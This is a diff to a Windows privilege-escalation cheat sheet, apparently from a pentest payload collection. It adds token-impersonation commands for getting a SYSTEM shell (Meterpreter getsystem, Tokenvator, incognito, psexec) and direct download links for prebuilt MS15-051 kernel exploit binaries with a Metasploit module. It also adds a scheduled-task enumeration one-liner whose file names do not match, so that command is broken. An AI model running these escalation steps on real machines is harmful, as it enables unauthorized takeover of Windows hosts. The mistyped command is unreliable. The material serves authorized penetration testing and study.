@@ -18,12 +18,14 @@
 * [EoP - From local administrator to NT SYSTEM](#eop---from-local-administrator-to-nt-system)
 * [EoP - Living Off The Land Binaries and Scripts](#eop---living-off-the-land-binaries-and-scripts)
 * [EoP - Impersonation Privileges](#eop---impersonation-privileges)
+  * [Meterpreter getsystem and alternatives](#meterpreter-getsystem-and-alternatives)
   * [RottenPotato (Token Impersonation)](#rottenpotato-token-impersonation)
   * [Juicy Potato (abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)
 * [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposure)
   * [MS08-067 (NetAPI)](#ms08-067-netapi)
   * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---microsoft-windows-nt2000--2003--2008--xp--vista--7)
   * [MS11-080 (adf.sys)](#ms11-080-afd.sys---microsoft-windows-xp-2003)
+  * [MS15-051 (Client Copy Image)](#ms15-051---microsoft-windows-2003--2008--7--8--2012)
   * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
   * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
 * [References](#references)
@@ -423,6 +425,7 @@ Scheduled tasks
 
 ```powershell
 schtasks /query /fo LIST 2>nul | findstr TaskName
+schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
 Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
 ```
 
@@ -662,6 +665,16 @@ Microsoft.Workflow.Compiler.exe tests.xml results.xml
 
 ## EoP - Impersonation Privileges
 
+### Meterpreter getsystem and alternatives
+
+```powershell
+meterpreter> getsystem 
+Tokenvator.exe getsystem cmd.exe 
+incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe 
+psexec -s -i cmd.exe 
+python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc
+```
+
 ### RottenPotato (Token Impersonation)
 
 Binary available at : https://github.com/foxglovesec/RottenPotato
@@ -687,6 +700,7 @@ Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -n
 ### Juicy Potato (abusing the golden privileges)
 
 Binary available at : https://github.com/ohpe/juicy-potato/releases    
+:warning: Juicy Potato doesn't work in Windows Server 2019. 
 
 1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)
 
@@ -761,6 +775,23 @@ Metasploit : exploit/windows/local/ms10_015_kitrap0d
 Python: https://www.exploit-db.com/exploits/18176
 Metasploit: exploit/windows/local/ms11_080_afdjoinleaf
 ```
+
+### MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012
+
+```powershell
+printf("[#] usage: ms15-051 command \n");
+printf("[#] eg: ms15-051 \"whoami /all\" \n");
+
+# x32
+https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/Win32/ms15-051.exe
+
+# x64
+https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe
+
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
+use exploit/windows/local/ms15_051_client_copy_image
+```
+
 
 ### MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
 
